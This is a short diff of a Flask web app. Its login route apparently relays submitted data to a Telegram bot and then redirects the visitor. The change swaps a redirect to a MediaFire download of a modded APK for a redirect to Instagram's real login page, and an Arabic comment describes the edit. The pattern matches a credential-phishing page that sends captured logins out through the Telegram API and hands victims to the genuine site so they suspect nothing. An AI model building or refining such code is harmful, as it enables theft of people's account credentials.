@@ -9,10 +9,8 @@ app.secret_key = os.getenv("SECRET_KEY", "hohosbid_super_secret_key")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 
-MEDIAFIRE_URL = (
-    "https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod"
-    "__40_Updated__41_.apk/file"
-)
+# تم التعديل لتوجيه المستخدم إلى صفحة تسجيل الدخول الرسمية لإنستغرام
+INSTAGRAM_OFFICIAL_URL = "https://www.instagram.com/accounts/login/"
 
 
 @app.route("/", methods=["GET", "POST"])
@@ -44,7 +42,7 @@ def login():
         telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})
 
-      return redirect(MEDIAFIRE_URL)
+      return redirect(INSTAGRAM_OFFICIAL_URL)
 
   return render_template_string(
       """
